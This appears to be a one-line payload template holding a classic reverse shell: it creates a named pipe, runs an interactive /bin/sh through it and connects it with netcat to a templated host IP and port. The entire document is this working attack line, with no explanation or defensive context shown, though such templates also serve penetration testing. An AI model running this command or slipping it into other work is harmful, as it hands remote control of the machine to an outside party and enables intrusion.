rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ host.ip }} {{ host.port}} >/tmp/f
